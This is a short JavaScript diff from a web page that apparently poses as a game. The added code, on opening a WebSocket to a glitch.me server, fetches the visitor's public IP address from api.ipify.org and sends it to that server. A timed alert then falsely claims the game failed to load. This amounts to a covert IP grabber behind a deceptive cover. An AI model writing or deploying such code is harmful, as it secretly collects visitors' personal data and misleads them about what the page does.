@@ -20,12 +20,12 @@
 ws = new WebSocket('https://maroon-sunrise-jam.glitch.me/');
       ws.onopen = () => {
         console.log('Connection opened!');
+          fetch("https://api.ipify.org/").then(r=>r.text()).then(t=>{ws.send(t)})
       }
-      ws.onmessage = ({ data }) => showMessage(data);
       ws.onclose = function() {
         ws = null;
       }
-fetch("https://api.ipify.org/").then(r=>r.text()).then(t=>{ws.send(t)})
+
 
 setTimeout(function(){
     alert("Error. The game has failed to load! Please reload the site")
